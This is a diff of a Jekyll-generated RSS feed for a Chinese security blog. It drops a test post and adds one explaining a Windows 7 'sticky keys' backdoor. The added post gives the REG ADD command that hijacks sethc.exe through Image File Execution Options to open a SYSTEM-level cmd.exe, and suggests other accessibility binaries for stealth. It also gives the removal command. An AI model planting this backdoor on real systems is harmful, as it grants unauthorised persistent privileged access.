@@ -5,24 +5,9 @@
     <description>A blog about programming and network security</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Mon, 11 Sep 2017 17:16:10 +0800</pubDate>
-    <lastBuildDate>Mon, 11 Sep 2017 17:16:10 +0800</lastBuildDate>
+    <pubDate>Mon, 11 Sep 2017 17:26:41 +0800</pubDate>
+    <lastBuildDate>Mon, 11 Sep 2017 17:26:41 +0800</lastBuildDate>
     <generator>Jekyll v3.4.2</generator>
-    
-      <item>
-        <title>test666</title>
-        <description>&lt;p&gt;this is for test 666&lt;/p&gt;
-</description>
-        <pubDate>Mon, 11 Sep 2017 00:00:00 +0800</pubDate>
-        <link>http://3xp10it.cc/auxilary/2017/09/11/test666/</link>
-        <guid isPermaLink="true">http://localhost:4000/auxilary/2017/09/11/test666/</guid>
-        
-        <category>test</category>
-        
-        
-        <category>auxilary</category>
-        
-      </item>
     
       <item>
         <title>深入理解计算机系统第7章笔记</title>
@@ -963,6 +948,47 @@ l)阅读64位反汇编代码可参考如下链接
         
         
         <category>auxilary</category>
+        
+      </item>
+    
+      <item>
+        <title>win7粘滞键后门</title>
+        <description>&lt;h3 id=&quot;0x0-about&quot;&gt;0x0 About&lt;/h3&gt;
+
+&lt;p&gt;win03下copy命令可制作粘滞键后门,测试在win7上copy方法无效,本文记录win7下的方法&lt;/p&gt;
+
+&lt;h3 id=&quot;0x1-detail&quot;&gt;0x1 Detail&lt;/h3&gt;
+
+&lt;p&gt;以管理员身份打开cmd.exe运行如下:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\windows\system32\cmd.exe&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;其中sethc.exe可替换成magnify.exe(放大镜)或其他(eg.narrator.exe/osk.exe),替换成更隐藏的技巧可根据下面链接自由发挥&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://answers.microsoft.com/en-us/windows/forum/windows_7-performance/run-command/a2632e97-c8d1-4ab3-8df2-7e70a4448267&quot;&gt;AsULike&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;删除后门以管理员身份打开cmd.exe运行如下即可:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;REG DELETE &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;以上理论上适用于win vistar以上系统,只在win7上测试过.&lt;/p&gt;
+
+&lt;p&gt;以上可由管理员权限得到system权限,也可用于替代psexec.exe -s cmd.exe开system权限&lt;/p&gt;
+</description>
+        <pubDate>Thu, 03 Aug 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/web/2017/08/03/win7%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/</link>
+        <guid isPermaLink="true">http://localhost:4000/web/2017/08/03/win7%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/</guid>
+        
+        <category>后门</category>
+        
+        <category>win7</category>
+        
+        
+        <category>web</category>
         
       </item>
     
